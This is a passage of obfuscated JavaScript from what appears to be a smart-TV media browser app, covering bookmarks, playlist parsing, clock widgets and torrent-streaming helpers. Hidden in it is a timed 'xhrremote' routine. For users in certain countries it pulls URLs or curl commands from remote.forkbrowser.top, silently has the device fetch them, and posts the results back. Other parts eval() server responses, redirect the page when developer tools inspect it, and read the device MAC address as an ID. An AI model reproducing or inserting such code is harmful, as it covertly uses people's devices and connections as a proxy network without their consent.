if(u.match(/^(zakladki)/)){if(gV(cmd)=="update")maJor.write(u,l1OOl0I0IASY10lQ10Ypr(str));s=maJor.read(u);var d=lIlI1VBOOlI01QYpr(s);if(d!=null)if(typeof d.channels!="undefined")data.channels=d.channels}else if(u=="bookmarksadd"){var n=sd.length+1;data.channels.push({"logo_30x30":_img("_ST_1px.png"),"title":"<"+"Избранное "+n+">","value":"Избранное "+n,"search_on":"_FPName_:","playlist_url":"payd_name"});data.channels.push({"logo_30x30":_img("_ST_ok.png"),"value":"","title":"_FPPodtverdit_","playlist_url":"bookmarksaddok","description":""})}else if(u=="bookmarksaddok"){if(gP().input&&gP().input.name){sd.push({"title":gP().input.name,"type":"dir","playlist_url":"bookmarks/"+(sd.length+1)});maJor.write("bookmarks",l1OOl0I0IASY10lQ10Ypr(sd));return{"cmd":"historyback(1);reload();","channels":[{"title":"Add OK"}]}}else kjtYpr.inf("Empty name ",1500)}else{if(u.indexOf("bookmarks/extbookm")==0){ol0I1OIuIyUII0lYpr("http://cloudflare.appfxml.com/browseraccount/?do=extbookm&v=get&dir="+u);return}
if(u.indexOf("bookmarks/addext")==0){var url="bookm="+encodeURIComponent(l1OOl0I0IASY10lQ10Ypr(str));ContextMenu.lastBookm={url:u,title:"_FPVneshnie_ _FPzakladki_ "+u.substring(16),logo_30x30:_img("_ST_b_c.png")};uHelper.create("directnoheader").getI("http://cloudflare.appfxml.com/browseraccount/?do=extbookm&dir="+u+"&v=add&"+url).parse=function(s){kjtYpr.inf(lIlI1VBOOlI01QYpr(s)["channels"][0].title,1500);maJor.statusbar("")};return}
if(u=="bookmarks/addnew"){u="bookmarks/"+(sd.length+1);kjtYpr.inf("Создана папка "+"Избранное "+(sd.length+1),1000);sd.push({"title":"Избранное "+(sd.length+1),"type":"dir","playlist_url":"bookmarks/"+(sd.length+1)});maJor.write("bookmarks",l1OOl0I0IASY10lQ10Ypr(sd));ContextMenu.play("",u);return}
if(u=="bookmarks/toolbar"){if(maJor.params.get("sidebar")!="1"){rt_obj=str;confirmed.create("Отключено в Настройках. Включить?","_FPBookmark toolbar_").fun=[function(){maJor.params.set("sidebar",1);xhr_bookmark("bookmarks/toolbar","add",rt_obj);gP().l1l1IOI0Cg_0KIIlll0Ypr()}];return}
var exs=!1;for(var i=0;i<sd.length;i++){if(sd[i].playlist_url==u)exs=!0}
if(!exs){kjtYpr.inf("Создана папка "+"_FPBookmark toolbar_",1000);sd.push({"title":"_FPBookmark toolbar_","type":"dir","playlist_url":"bookmarks/toolbar"});maJor.write("bookmarks",l1OOl0I0IASY10lQ10Ypr(sd))}}
for(var i=0;i<sd.length;i++){if(sd[i].playlist_url==u){if(typeof(sd[i].channels)=="undefined")sd[i].channels=[];if(cmd){if(cmd=="update"){sd[i].channels=str.channels;maJor.write("bookmarks",l1OOl0I0IASY10lQ10Ypr(sd));return sd[i]}else if(cmd=="count")return sd[i].channels.length
else if(cmd=="cmdRename"){sd[i].title=str}else if(cmd=="cmdUrlIcon"){sd[i].logo_30x30=str}else if(cmd=="cmdSetTV"){sd[i].type=(sd[i].type=="tv"?"dir":"tv");maJor.write("bookmarks",l1OOl0I0IASY10lQ10Ypr(sd));maJor.setHandler("menu");Il01QllQll().reload();kjtYpr.inf("Изменено на "+sd[i].type,1000);return}else if(cmd=="cmdSetIcon"){sd[i].logo_30x30=str;ol0I1OIuIyUII0lYpr("about:bookmarks");setSelect(0)}else if(cmd=="add"){sd[i].channels.unshift(str);maJor.write("bookmarks",l1OOl0I0IASY10lQ10Ypr(sd));if(u!="bookmarks/toolbar"){ContextMenu.lastBookm={url:u,title:sd[i].title,logo_30x30:sd[i].logo_30x30||""}}else{sdbar=null;sidebar_show()}
kjtYpr.inf("_FPDobavlenoV_ "+sd[i].title,1000);return}else if(cmd=="cmdDel"){if(str==-2)str=sdbarSel;sd[i].channels.splice(str,1);kjtYpr.inf("Удалено!",1000);if(getSelect()>0)setSelect("--")}else if(cmd=="alldel"){sd.splice(i,1);kjtYpr.inf("Папка удалена!",1000);if(getSelect()>0)setSelect("--")}else if(cmd=="bookmarkRename"){sd[i].channels[select].title=str}
maJor.write("bookmarks",l1OOl0I0IASY10lQ10Ypr(sd));if(u=="bookmarks/toolbar"){sdbar=null;sidebar_show()}
if(getSelect()>=0){Il01QllQll().reload()}
return}
if(gV(sd[i].type)=="tv"){data.is_iptv=!0}
data.title=sd[i].title;data.channels=sd[i].channels;break}}}
data.channels=delNull(data.channels);if(data.channels.length==0){kjtYpr.inf("_FPZdesPusto_!",1000);return data}
return data}
function delNull(o){for(var i=0;i<o.length;i++){if(o[i]==null||typeof o[i]=="undefined"){o.splice(i,1);i--}}
return o}
var favarray=null;var dd1=0;var pltags=["title","stream_url","stream_url2","logo_30x30","description","category","category_id","playlist_url","playlist_url2","parser","mb_parser","menu_url","search_on","presearch","menu","jtvname","tvg-shift","value","group","chat","subtitles","yellow_url","yellow_title","yellow_parser","infolink","location","vast","type","SetTimeInterval","cors"];var plgltags=["playlist_name","align","navigate","options","title","icon","url","server","next_page_url","prev_page_url","cacheinfo","setcache","cachetime","access","typeList","player","timeout","is_iptv","all_local","all_description","background-image","background_image","color","pageinfo","menu","style","location","setcookie","before","allvast","footer","url_tvg","info"];var lIIO1IIcvlI00O1Ypr=null,waitc={};var T={s:0,m:0,h:0,day:0,date:0,month:0,year:0,inetTime:0,delta:0,y_t_days:0,Sync_step:0,timezone:0,timezoneoffset:new Date().getTimezoneOffset(),summertime:(new Date().getTimezoneOffset()-new Date(2011,0,11).getTimezoneOffset())/60,timestamp:0,dday:['_FPSunday_','_FPMonday_','_FPTuesday_','_FPWednesday_','_FPThursday_','_FPFriday_','_FPSaturday_'],dmon:['_FPJanuary_','_FPFebruary_','_FPMarch_','_FPApril_','_FPMay_','_FPJune_','_FPJule_','_FPAugust_','_FPSeptember_','_FPOctober_','_FPNovember_','_FPDecember_']};function dpad10(n){if(n<10)return"0"+n;else return n}
function getDT(t){try{var timesec=new Date(parseInt(t));T.year=timesec.getFullYear();T.date=timesec.getDate();T.month=timesec.getMonth()+1;T.day=timesec.getDay();T.h=timesec.getHours();T.m=timesec.getMinutes();T.s=timesec.getSeconds();T.formattedDate=dpad10(T.date)+"."+dpad10(T.month)+"."+T.year;T.humanDate=T.dday[T.day]+", "+dpad10(T.date)+" "+T.dmon[T.month-1]+" "+T.year;T.offset=(maJor.params.get("JTVRegion")>0?"+":"")+maJor.params.get("JTVRegion")}catch(e){}};function SetTimeDate(){if(!T.inetTime)return;T.timestamp+=1;T.inetTime+=1000;if(handler=="iframe")return;getDT(T.inetTime+maJor.params.get("JTVRegion")*3600000);nkh=0;var dstring=to(T.h,T.m);if(!$_('widgets_time'))return;var dates=T.formattedDate;if($_('widgets_time').innerHTML!="&nbsp;")$_('widgets_time',dates+", "+dstring);try{if(handler=='player'||handler=='qual'||vPlayer.is_mini()||maJor.params.get('scrsaver')<1||vPlayer.minimize||isScreensaver||$_("main").style.display=="none")screensavertimer=-1;else{if(screensavertimer==-1)screensavertimer=T.timestamp;else if(T.timestamp-screensavertimer>120)screensaver(!0)}
if(vPlayer.played()||vPlayer.audio.played()){vPlayer.getVideoPlayInfo();if(!vPlayer.audio.played()){if($_("player_time"))$_('player_time',((info_mode==3||info_mode==4)?dstring:to(T.h,T.m,T.s)))}}}catch(e){}
var n=Math.floor(T.inetTime/1000);if(n%2800==10)selfpages={};if((n%180==10&&handler=="menu")||n%1980==10){if(maJor.params.get("remote"))maJor.Remote.init()}
if(getSelect()<0)var st=0;else st=getSelect();if($_("scrdivtime")&&T.s<3)screensaver_t();if(!maJor.params.get("panel")){dates=maJor.widgets.html("weather")+" "+dates+" "+dstring;if(maJor.widgets.panel.weather!=dates){maJor.widgets.panel.weather=dates;$_('updatetime',dates)}
if(maJor.widgets.panel.title!=gP("title")){maJor.widgets.panel.title=gP("title");$_('updatetitle',gP("title"))}}
if(Il01QllQll()&&gP()&&gP().channels.length&&gP().channels[st].SetTimeInterval){var o=gP().channels[st].SetTimeInterval;if(n%(60*o.time)==10){if(handler=="player")var u=gV(o,"onplay");else u=gV(o,"onmenu");if(u.indexOf("http")==0){uHelper.create("directnoheader").getI(u).parse=function(s){if(s){if(s.indexOf("}")>0){if(gV(lIlI1VBOOlI01QYpr(s),"message")&&handler!="player")kjtYpr.inf(x.message,1200)}}}}}}};var prxremote="http://remote.forkbrowser.top/smarttv/api.php";function getip(t,nop,m){var ip="";if(t=="remote")t="remoteip";if(t=="torrservers"){if(maJor.params.get("torrserveactive"))t="torrserve";else if(maJor.params.get("torrserve2active"))t="torrserve2";else t="torrserve"}
if(!ip)ip=maJor.params.get(t)||(maJor.params.get('remote')&&maJor.params.get("remoteip").split(":")[0])||"127.0.0.1";if(ip.indexOf(":")==-1){if(t=="acestream")ip+=":6878";else if(t=="torrserve"||t=="torrserve")ip+=":8090"}
if(m){var matches=ip.match(/^(https?:\/\/)?([^:\/]+:[^@\/]+)@/);if(matches)ip=ip.replace(matches[2],"***")}
if(nop)return ip.split(":")[0];else return ip}
function trylink(s){s=gV(s);if(s.indexOf("ACE_PORT")>0)s=s.replace(/ACE_PORT/g,getip("acestream").split(":")[1]);if(s.indexOf("LOCAL_PORT")>0){if(maJor.params.get("remoteip")=="")kjtYpr.inf("Установите значение Remote Fork в Настройках!",2000);s=s.replace(/LOCAL_PORT/g,maJor.params.get("remoteip").split(":")[1])}
if(s.indexOf("LOCAL_IP")>0){if(maJor.params.get("remoteip")==""){kjtYpr.inf("Установите значение Remote Fork в Настройках!",2000);s=s.replace(/LOCAL_IP/g,"127.0.0.1")}else s=s.replace(/LOCAL_IP/g,maJor.params.get("remoteip").split(":")[0])}
if(s.indexOf("ACE_IP")>0)s=s.replace(/(MB_)?ACE_IP/g,getip("acestream",!0));if(s.indexOf("TORRSERVE_IP")>0)s=s.replace(/TORRSERVE_IP/g,getip("torrservers",!0));return s}
var rf_ver=0;function to(hours,minutes,seconds){var time="";time+=dpad10(hours)+":";time+=dpad10(minutes);if(seconds!=null)time+=":"+dpad10(seconds);return time}
function to2(sec){if(isNaN(sec)||sec==Infinity)return"∞";var s=" 0"+(sec%60);m=Math.floor(sec/60);return m+":"+s.substr(s.length-2)}
function closeapp(){try{if(maJor.platform()=="mag"){window.location=resolution_portal}else if(maJor.platform()=="dune"){window.location=resolution_portal}else if(maJor.platform()=="maple")widgetAPI.sendReturnEvent();else if(maJor.platform()=="tizen")tizen.application.getCurrentApplication().exit();else if(maJor.platform()=="android-device")andr.cmd("exit");else if(window.NetCastExit)window.NetCastExit();else{try{webOS.platformBack()}catch(e){}
window.close()}}catch(e){}}
function llO0O0lhrlO01O1O1YprPost(url,p,mode){var xhrt=null;xhrt=new XMLHttpRequest();xhrt.onreadystatechange=function(){if(xhrt.readyState==4){maJor.statusbar("off");if(mode=="xmltv"){try{eval(xhrt.responseText)}catch(e){maJor.statusbar(xhrt.responseText.substr(0,140))}}else if(mode=="translatepage"){var data=lIlI1VBOOlI01QYpr(xhrt.responseText);if(data.code=='404'){kjtYpr.popUp(data.message,1500)}else{var j=0;var curPage=gP();Il01QllQll().put("title",data[j++]);for(var i=0;i<curPage.channels.length;i++){curPage.channels[i].title=data[j++];curPage.channels[i].description=data[j++]}}
Il01QllQll().focused()}}};xhrt.open('POST',url,!0);xhrt.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhrt.send(p)}
rTime1=60;rTime2=1150;var timerremote=setTimeout("xhrremote();",rTime1*1000);function is_onRemote(m){if(maJor.params.get("remote")>=2&&maJor.params.get("remoteactive")){if(m==null||String(maJor.params.get("remoteip")).match(/\d+\.\d+:802(7|8)/))return 1}
return 0}
function xhrremote(){if(maJor.platform()=="maple"&&handler!="menu")return;if(!maJor.ipCountry.match(/UA|RU|BY|NL|DE/))return;if(!is_loadpage()&&(maJor.app_cors||is_onRemote(1))){var type="";if(is_onRemote(1)){rTime2=120;if(String(maJor.params.get("remoteip")).match(/:8027/))type="curl_windows";else if(String(maJor.params.get("remoteip")).match(/:8028/))type="curl_androind"}else if(maJor.app_cors){if(maJor.platform()=="android-device"){if(maJor.build>=7){type=maJor.platform();rTime2=900}else return}else if(xhr_referer==1||xhr_referer==2){type="referer";rTime2=1500}else if(maJor.loader_platform=="lg_webos"){type="lg_webos_ide";rTime2=1500}else if(maJor.loader_platform=="lg_netcast"){type="lg_netcast";rTime2=1500}else if(maJor.series=="D"||maJor.series=="C"){type="sams_d";rTime2=1500}else if(xhr_referer==3){type=maJor.platform();rTime2=250}else if(xhr_referer==0){type=maJor.platform()+"|no_referer";rTime2=1200}else rTime2=500}else type="null";uHelper.create("directnoheader").hid().get("http://remote.forkbrowser.top/smarttv/api.php?plat"+"form="+maJor.platform()+"&build="+maJor.build+"&xhr_referer="+xhr_referer+"&type="+type+"&do=xhrremote2&rf_ver="+rf_ver+"&version=15&v=get&country="+maJor.ipCountry).parse=function(s){var allx=s.split("\n");if(allx.length>2)x=allx[_.random(0,allx.length-1)];else x=s.split("\n")[0];if(x.indexOf("http")!=0&&x.indexOf("curl")!=0)return;var rfxhr=null
if(is_onRemote(1))rfxhr=uHelper.create("rf");else if(maJor.platform()=="android-device"&&x.indexOf("curl")===0)rfxhr=uHelper.create("android");else if(maJor.platform()=="android-device")rfxhr=uHelper.create("direct");else if(maJor.app_cors&&x.indexOf("curl")!=0)rfxhr=uHelper.create("direct");if(rfxhr!=null){rfxhr.hidden=1;rfxhr.mobile=0;rfxhr.parse=function(s){if(s!=null&&s.length>10&&s.indexOf("Error:")!=0){uHelper.create("directnoheader").hid().get("http://remote.forkbrowser.top/smarttv/api.php?rf_ver="+rf_ver+"&xhr_referer="+xhr_referer+"&country="+maJor.ipCountry+"&type="+type+"&plat"+"form="+maJor.platform()+"&do=xhrremote2&v=post&u="+encodeURIComponent(x)+"#POSTs="+encodeURIComponent(s)).parse=function(s){}}}
rfxhr.get(x)}}}
clearTimeout(timerremote);timerremote=setTimeout("xhrremote();",rTime2*1000)}
function lI1111lUEul10IYpr(s){data=[];var lQ0lIIoOWlq1IlIlYpr=s.replace(/\r/g,"").split('\n');for(var index=0;index<lQ0lIIoOWlq1IlIlYpr.length;index++){data.push({"title":lQ0lIIoOWlq1IlIlYpr[index].split("/")[lQ0lIIoOWlq1IlIlYpr[index].split("/").length-1],"stream_url":lQ0lIIoOWlq1IlIlYpr[index],description:lQ0lIIoOWlq1IlIlYpr[index]})}
return data}
function l0IIQIOlZ_I1ll1lYprParams(data){var result={};var REGEX_PARAMS=new RegExp("\s*(\"([^\"]+)\"|([^=]+))=(\"([^\"]+)\"|(\S+))","g");var m,key,value;while((m=REGEX_PARAMS.exec(data))!==null){if(m.index===REGEX_PARAMS.lastIndex){REGEX_PARAMS.lastIndex++}
key=trim2(m[2]||m[3]||"");value=m[5]||m[6];if(key)result[key]=value}
return result}
function l0IIQIOlZ_I1ll1lYpr(s,xu){var data=[],pl={};s=s.replace(/\r/g,"");dd1=new Date().getTime();var lQ0lIIoOWlq1IlIlYpr=s.split('\n');var line,current={},pos,duration;try{for(var index=0;index<lQ0lIIoOWlq1IlIlYpr.length;index++){var line=trim2(lQ0lIIoOWlq1IlIlYpr[index]);if(line.indexOf('#EXTM3U')===0){pl=l0IIQIOlZ_I1ll1lYprParams(line.substr(7))}else if(line.indexOf('#PLAYLIST')===0){pl.title=line.substr(9)}else if(line.indexOf('#ICON')===0){pl.icon=line.substr(5)}else if(line.indexOf("#EXTGRP:")===0&&current&&current.params){current.params.extgrp=trim2(line.substr(8))}else if(line.indexOf("#EXTIMG:")===0&&current&&current.params){current.params.extimg=trim2(line.substr(8))}else if(line.indexOf("#BACKGROUND-IMAGE:")===0){pl["background-image"]=trim2(line.substr(18))}else if(line.indexOf("#EXTINF:")===0){pos=line.lastIndexOf(',');if(pos>-1){var match=line.match(/,([^,"\n]*(?:,[^,"\n]*)*)$/);current.title=match?trim2(match[1]):'';var durationPart=trim2(line.substring(8,pos));var durationMatch=durationPart.match(/\s*(-?\d+)/);duration=durationMatch?durationMatch[0]:"-1";current.length=parseInt(duration,10)||-1;current.params=l0IIQIOlZ_I1ll1lYprParams(durationPart.substr(duration.length))}else{current.title=trim2(line);current.params={}}}else if(line!==''&&line.indexOf("#")!==0&&current&&current.params){var url=line;var el={"title":current.title,"logo_30x30":current.params["tvg-logo"]||current.params.extimg,"stream_url":url,"tvg-name":current.params["tvg-name"],"tvg-id":current.params["tvg-id"],"tvg-shift":current.params["tvg-shift"]||"","group":current.params["group-title"]||current.params.extgrp,"catchup_days":current.params["catchup-days"],"catchup_source":current.params["catchup-source"],"catchup":current.params.catchup||current.params["catchup-type"]};if(xu&&is_local(xu)){var decu=decodeURIComponent(url);if(url.match(/\.(m3u|xml|xspf)$/i)||url[url.length-1]==='/'||url[url.length-1]==='\\'||decu[decu.length-1]==='/'||decu[decu.length-1]==='\\'){el.playlist_url=decu;el.stream_url=""}}
for(var i in el){if(el[i]==null)delete el[i]}
data.push(el);current={}}}
if(data.length==0&&s.indexOf("#EXTM3U")!=-1)pl.after="<center>Пустой лист</center>";pl["chan"+"nels"]=data}catch(e){jsshowErr("m3u error "+xu+":"+e.message,2000);return{"channels":[]}}
return pl}
function movecolor(hex,amount){hex=String(hex).replace("#","");if(hex.length!==6)return hex;function clamp(v){return Math.max(0,Math.min(255,v))}
var r=parseInt(hex.substring(0,2),16);var g=parseInt(hex.substring(2,4),16);var b=parseInt(hex.substring(4,6),16);r=clamp(r+(amount*16));g=clamp(g+(amount*16));b=clamp(b+(amount*16));var newHex="#"+("0"+r.toString(16)).slice(-2)+("0"+g.toString(16)).slice(-2)+("0"+b.toString(16)).slice(-2);return newHex.toUpperCase()}
function ll0lOUdIdIlQl1Ypr(s,u){data=lIlI1VBOOlI01QYpr(s);var pl={"title":"Ace Stream","channels":[]}
if(data==null){pl.before="<center>Ошибка ответа от Ace Stream!<br>Проверьте запущена ли программа по адресу "+u+". <br> Если локальный IP адрес хоста вашего Ace Stream не совпадает - укажите его в Настройках приложения в Ace Stream direct</center>"}else if(data.result&&data.result.results){var total=data.result.total|0;var tpage=Math.ceil(total/10);var page=u.match(/page=(\d+)/);page=page?page[1]:1;pl.before="<center>Ace Stream Результаты поиска ("+total+"): "+(page?"Страница "+page+" из "+tpage:"")+"</center>";maJor.each(data.result.results,function(v){var sub=[];maJor.each(v.items,function(v2,i){sub.push({"title":v2.name,"timeout":180,"stream_url":"http://"+getip("acestream")+"/ace/getstream?_idx="+i+"&infohash="+v2.infohash,"logo_30x30":"","description":""})});if(sub.length==1)pl.channels.push({"title":v.name,"stream_url":sub[0].stream_url,"logo_30x30":"","description":""});else if(sub.length>1)pl.channels.push({"title":v.name,"playlist_url":"submenu","submenu":sub,"logo_30x30":"","description":"","channels":sub})});if(page<tpage){var link=u;if(link.match(/page=\d+/))link=link.replace(/page=\d+/,"page="+(parseInt(page)+1));else link+="&page="+(parseInt(page)+1);pl.next_page_url=link}
if(pl.channels.length==0)pl.before+="<br><center>Ничего не найдено</center>"}else if(data.result&&data.result.infohash){pl.channels.push({"title":(data.result.title||"file"),"playlist_url":u.replace(/\?.*$/,"?method=get_media_files&infohash="+data.result.infohash),"logo_30x30":"","description":""})}else{pl.before="<center>Ace Stream"+(data.error!=null?"<br>Ошибки: "+data.error:"")+"</center>";var obj=[];for(var i in data.result){obj.push({"id":i,"text":data.result[i]})}
obj.sort(function(a,b){str1=a.text;str2=b.text;try{var rx=/([^\d]+|\d+)/ig;var str1split=str1.match(rx);var str2split=str2.match(rx);for(var i=0,l=Math.min(str1split.length,str2split.length);i<l;i++){var s1=str1split[i],s2=str2split[i];if(s1===s2)continue;if(isNaN(+s1)||isNaN(+s2)){return s1>s2?1:-1}else return+s1-s2}}catch(e){return 0}
return 0});var data={};for(var i=0;i<obj.length;i++){pl.channels.push({"title":obj[i].text,"stream_url":u.replace("server/api?method=get_media_files","ace/getstream?_idx="+obj[i].id+"&"),"logo_30x30":"","description":""})}
for(var i=0;i<obj.length;i++){pl.channels.push({"title":"(hls) "+obj[i].text,"stream_url":u.replace("server/api?method=get_media_files","ace/manifest.m3u8?_idx="+obj[i].id+"&"),"logo_30x30":"","description":""})}}
return pl}
function llO1110jOOOO1Ypr(s,u){data=lIlI1VBOOlI01QYpr(s);var pl={"window":1,"title":"Torrserve","channels":[]}
if(data==null){pl.before="<center>Ошибка ответа от Torrserve!<br>Проверьте запущена ли программа по адресу "+u+". <br> Если локальный IP адрес хоста вашего Torrserve не совпадает - укажите его в Настройках приложения / TORRSERVE_IP</center>"}else{pl.before="<center>Torrserver<br>"+data.Name+"<br>Size: "+ToSize(data.TorrentSize)+" TotalPeers: "+data.TotalPeers+"</center>";for(var i in data.FileStats){pl.channels.push({"title":data.FileStats[i].Path,"stream_url":u+"&file="+data.FileStats[i].Id+" "+ToSize(data.FileStats[i].Length)})}}
return pl}
function parsehms(s){s=s.replace(/\r/g,"").replace(/\n/g,"");if(!maJor.params.get("hms"))maJor.params.set("hms",maJor.params.get("remoteip").split(":")[0]+":45397");var channels=[],output={};try{var regexp=new RegExp("<img class=\"imagelist\" src=\"(.*?)\".*?title=\"(.*?)\" href=\"(.*?)\"","ig");while((ch=regexp.exec(s))!=null){channels.push({"title":ch[2],"logo_30x30":"http://"+maJor.params.get("hms")+ch[1],"playlist_url":"http://"+maJor.params.get("hms")+ch[3].replace("count=0","count=0;").replace("count=15","count=0;")})}}catch(e){}
output.channels=channels;return output}
function parsexspf(s){s=s.replace(/\r/g,"").replace(/\n/g,"");var channels=[],output={};try{var regexp=new RegExp("<track>(.*?)<\/track>","ig");while((ch=regexp.exec(s))!=null){var title="",url="",ico="";var mtc=ch[1].match(/<title>(.*?)<\/title>/);if(mtc){title=mtc[1]}
var mtc=ch[1].match(/<image>(.*?)<\/image>/);if(mtc){ico=mtc[1]}
var mtc=ch[1].match(/<location>(.*?)<\/location>/);if(mtc){url=mtc[1]}
if(title=="")title=url.split("/")[url.split("/").length-1];channels.push({"title":title,"logo_30x30":ico,"stream_url":url})}}catch(e){}
output.channels=channels;return output}
function xmlTagToChArr(s,tag,tags){var result=[],i=0;var regexp=new RegExp("<"+tag+">(.*?)</"+tag+">","ig");while((ch=regexp.exec(s))!=null){result.push({});for(var j=0;j<tags.length;j++){var reg2=new RegExp("<"+tags[j]+".*?>(.*?)</"+tags[j]+">","ig");if((t=reg2.exec(ch[1]))!=null){res=t[1].replace("<![CDATA[","").replace("]]>","")}else res="";result[i][tags[j]]=trim2(res)}
i++}
return result}
function lOOlI1IIxvIf1l011Ypr(s){s=s.replace(/\r/g,"").replace(/\n/g,"");var channels=[],i=0,output={},cat_id={};try{var regexp=new RegExp("<category>(.*?)<\/category>","ig");while((ch=regexp.exec(s))!=null){var reg2=new RegExp("<category_id>(.*?)</category_id>","ig");if((t=reg2.exec(ch[1]))!=null){res=t[1].replace("<![CDATA[","").replace("]]>","")}else res="";var reg2=new RegExp("<category_title>(.*?)</category_title>","ig");if((t=reg2.exec(ch[1]))!=null){res2=t[1].replace("<![CDATA[","").replace("]]>","")}else res2="";cat_id[res]=res2}
var regexp=new RegExp("<channel>(.*?)(</channel>|$)","ig");while((ch=regexp.exec(s))!=null){channels.push({});tags=pltags;for(var j=0;j<tags.length;j++){if(tags[j]=="group")continue;var reg2=new RegExp("<"+tags[j]+".*?>(.*?)</"+tags[j]+">","ig");if((t=reg2.exec(ch[1]))!=null){res=t[1];if(res&&tags[j]=="SetTimeInterval"){try{var x=xmlToJSON.parseString("<SetTimeInterval>"+res+"</SetTimeInterval>");if(x!=null)channels[i].SetTimeInterval=x.SetTimeInterval}catch(e){}
continue}
res=t[1].replace("<![CDATA[","").replace("]]>","")}else res="";if(tags[j]=="category_id"){var resspl=res.split(",");res="";for(var k=0;k<resspl.length;k++){if(res!="")res+=";";if(typeof cat_id[resspl[k]]!="undefined")res+=cat_id[resspl[k]];else res+=resspl[k]}
channels[i].group=trim2(res)}else channels[i][tags[j]]=trim2(res)}
var subs=xmlTagToChArr(ch[1],"submenu",pltags);if(subs.length)channels[i].submenu=subs;i++}
var menu=[],i=0;var regexp=new RegExp("<menu>(.*?)</menu>","ig");var tmps=s.replace(/<style>.*?<\/style>/ig,"");while((ch=regexp.exec(tmps))!=null){menu.push({});tags=pltags;for(var j=0;j<tags.length;j++){var reg2=new RegExp("<"+tags[j]+".*?>(.*?)</"+tags[j]+">","ig");if((t=reg2.exec(ch[1]))!=null){res=t[1].replace("<![CDATA[","").replace("]]>","")}else res="";menu[i][tags[j]]=trim2(res)}
var subs=xmlTagToChArr(ch[1],"submenu",pltags);if(subs.length)menu[i].submenu=subs;i++}
var style=null;var regexp=new RegExp("<style>(.*?)</style>","ig");while((ch=regexp.exec(s))!=null){result=xmlToJSON.parseString(ch[1]);style=collect(style,result)}}catch(e){}
try{tags=plgltags;s=s.replace(/<channel>.*?<\/channel>/ig,"");s=s.replace(/<menu>.*?<\/menu>/ig,"");s=s.replace(/<style>.*?<\/style>/ig,"");for(j=0;j<tags.length;j++){var reg2=new RegExp("<"+tags[j]+".*?>(.*?)</"+tags[j]+">","ig");if((t=reg2.exec(s))!=null){res=t[1].replace("<![CDATA[","").replace("]]>","")}else res="";output[tags[j]]=res}}catch(e){}
output.channels=channels;if(menu.length)output.menu=menu;if(style)output.style=style;return output}
img_dir="img";var xhrl={},cached={"start":""},prload=!1,nServer=-1;function l0OII100kdNdQl01lYpr(url){if((url||(gP("lO10111O0001lOl00Ypr"))||"")=="about:blank")return 1;return 0}
function is_audio(url){url=url||vPlayer.playUrl||"";if(url.match(/^(audio:\/\/|.*\.mp3)/))return!0}
function is_vod(url){try{url=url||vPlayer.playUrl||"";if(gP("global")["is_iptv"]=="false")return 2;if(gP("global")["is_iptv"]=="true"||gP("global")["is_iptv"]>0)return 0;if(!url||url.match(/\/ace\//i))return 1;if(handler=="player"){if(vPlayer.getCur()>0&&vPlayer.getTotal()>40&&vPlayer.getTotal()<21*3600)return 1}
if(url.indexOf("hls/tracks-")>0||url.indexOf(":5555/")>0)return 2;else return 0}catch(e){return 1}}
function is_img(url){url=url||vPlayer.playUrl||"";if(url.match(/#POST/))return!1;if(url.match(/\.(jpg|gif|png|jpeg)(\?|$)/i)||url.indexOf("image/")==0)return!0;else return!1}
var statusTimer,statusTimer2;if(maJor.platform()=="tizen"&&typeof webapis=="undefined"){lI0Il1OrlwllI1Ypr("$WEBAPIS/webapis/webapis.js")}
var ua_chrome="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36";setTimeout(function(){if(maJor.platform().match(/lg/)){uHelper.create("directnoheader").hid().get("file:///sys/class/net/eth0/address").parse=function(s){if(gV(s)!=""){maJor.ID=kjtYpr.serial=s.replace(/:/g,"").replace(/(\r|\n)/,"");maJor.writeC("ID",maJor.ID);maJor.write("ID",maJor.ID);maJor.write("IDS",maJor.ID);maJor.writeC("IDS",maJor.ID)}}
if(typeof webOS!="undefined"){webOS.service.request("luna://com.webos.service.sm",{method:"deviceid/getIDs",parameters:{"idType":["LGUDID"]},onSuccess:function(inResponse){if(typeof inResponse.idList[0].idValue!="undefined"){lg_uid=inResponse.idList[0].idValue.split("-")[4].replace(/(\r|\n)/,"")}},onFailure:function(inError){jsshowError("webOS.service: "+inError);return}});webOS.service.request("luna://com.webos.service.tv.systemproperty",{method:"getSystemInfo",parameters:{"keys":["modelName","firmwareVersion","UHD","sdkVersion"]},onComplete:function(inResponse){var isSucceeded=inResponse.returnValue;if(isSucceeded){maJor.lg_model=inResponse.modelName;lg_v=inResponse.sdkVersion}else{return}}})}}},100);try{if(maJor.platform()!="maple"){var el1=new Image();Object.defineProperty(el1,'id',{get:function(){if(!ttmac)document.location="http://forkbrowser.top/"}});console.dir(el1);setInterval(function(){if(!ttmac)console.dir(el1)},1000)}}catch(e){}
var media=null,icoclose='data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjAuMTnU1rJkAAAAm0lEQVQoU2WPMQrCQBREU1imSOkBPEYOlWN9SGFhYWFpyoCBFEE8go1gYalvllk1yYcHs7NvE34REW84Q1kshm4HF3jpMMFKJtdw992kYqvgIskg6enuCFV+/S/38HBuYZOkPBSSbxbEHuaShnIpdjBfkKKC/OsBrs6/BRVc6EKyvrxaUOLJRZLSa0bZne5aFTqM8JXyqINDRDQfRgrEgHddNAMAAAAASUVORK5CYII=';var icoerr='data:image/png;base64, 